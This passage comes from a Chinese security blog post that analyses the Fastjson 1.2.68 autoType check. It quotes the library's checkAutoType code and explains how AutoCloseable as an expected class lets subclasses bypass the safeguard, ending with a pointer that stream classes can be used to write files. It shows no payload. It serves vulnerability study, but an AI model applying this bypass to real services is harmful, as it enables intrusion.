clazz);</span><br><span class="line">                            <span class="keyword">return</span> clazz;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (ClassLoader.class.isAssignableFrom(clazz) || DataSource.class.isAssignableFrom(clazz) || RowSet.class.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span> (expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                                TypeUtils.addMapping(typeName, clazz);</span><br><span class="line">                                <span class="keyword">return</span> clazz;</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="type">JavaBeanInfo</span> <span class="variable">beanInfo</span> <span class="operator">=</span> JavaBeanInfo.build(clazz, clazz, <span class="built_in">this</span>.propertyNamingStrategy);</span><br><span class="line">                        <span class="keyword">if</span> (beanInfo.creatorConstructor != <span class="literal">null</span> &amp;&amp; autoTypeSupport) &#123;</span><br><span class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">                            TypeUtils.addMapping(typeName, clazz);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">return</span> clazz;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>typename是java.lang.AutoCloseable</p>
+<p>前面都是黑名单的检测，我们跳到if (!internalWhite &amp;&amp; (this.autoTypeSupport || expectClassFlag)) 这里开始看</p>
+<p>这里检测是否是内部白名单，我们肯定不是，this.autoTypeSupport || expectClassFlag这里都是false，所以我们进不去</p>
+<p>然后跳到<code>clazz = TypeUtils.getClassFromMapping(typeName);</code></p>
+<p>他在缓存里面是有的，所以直接clazz赋值为java.lang.AutoCloseable，然后就return出去，出去之后获得一个反序列化器，然后反序列化，我们去看看com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#deserialze(com.alibaba.fastjson.parser.DefaultJSONParser, java.lang.reflect.Type, java.lang.Object, java.lang.Object, int, int[])</p>
+<p>我们type传入的是java.lang.AutoCloseable</p>
+<p>这个代码巨长就不贴了</p>
+<p>他在这里面还是会进行checkAutoType，我们type传入的是AutoCloseable，故expectClass就是AutoCloseable</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if (refObj == null) &#123;</span><br><span class="line">    Class&lt;?&gt; expectClass = TypeUtils.getClass(type);</span><br><span class="line">    userType = config.checkAutoType(ref, expectClass, lexer.getFeatures());</span><br><span class="line">    refObj = parser.getConfig().getDeserializer(userType);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>那么好，我们还是来到判断<code>if (!internalWhite &amp;&amp; (this.autoTypeSupport || expectClassFlag))</code></p>
+<p>这个时候我们expectClassFlag为ture，直接进入，但是和漏洞没关系，往下走</p>
+<p>最关键的地方，expectClass不为null，则判断目标类是否是expectClass类的子类，是的话就添加到Mapping缓存中并直接返回该目标类，否则直接抛出异常导致利用失败</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if (expectClass != null) &#123;</span><br><span class="line">    if (expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">        TypeUtils.addMapping(typeName, clazz);</span><br><span class="line">        return clazz;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>ok我们这里就成功了</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>IntputStream和OutputStream都是实现自AutoCloseable接口的，主要是寻找关于输入输出流的类来写文件</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/Mouri-Kogorou">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Fastjson1-2-68"><span class="toc-number">1.</span> <span class="toc-text">Fastjson1.2.68</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#demo"><span class="toc-number">1.2.</span> <span class="toc-text">demo</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.3.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.4.</span> <span class="toc-text">漏洞利用</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/06/04/Fastjson1-2-68/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/06/04/Fastjson1-2-68/&text=Fastjson1.2.68"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/06/04/Fastjson1-2-68/&title=Fastjson1.2.68"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/06/04/Fastjson1-2-68/&is_video=false&description=Fastjson1.2.68"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Fastjson1.2.68&body=Check out this article: http://example.com/2025/06/04/Fastjson1-2-68/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/06/04/Fastjson1-2-68/&title=Fastjson1.2.68"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/06/04/Fastjson1-2-68/&title=Fastjson1.2.68"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/06/04/Fastjson1-2-68/&title=Fastjson1.2.68"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/06/04/Fastjson1-2-68/&title=Fastjson1.2.68"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/06/04/Fastjson1-2-68/&name=Fastjson1.2.68&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/06/04/Fastjson1-2-68/&t=Fastjson1.2.68"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2003-2025
+    Mouri-Kogorou
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+      --><li><a href="/">Home</a></li><!--
+    --><!--
+      --><li><a href="/about/">About</a></li><!--
+    --><!--
+      --><li><a href="/archives/">Writing</a></li><!--
+    --><!--
+      --><li><a target="_blank" rel="noopener" href="https://github.com/Mouri-Kogorou">Projects</a></li><!--
+    -->
+      </ul>
+      <ul>
+        
+          <!-- 不蒜子统计 -->
+          <span id="busuanzi_container_site_pv">
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+                  本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+  
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
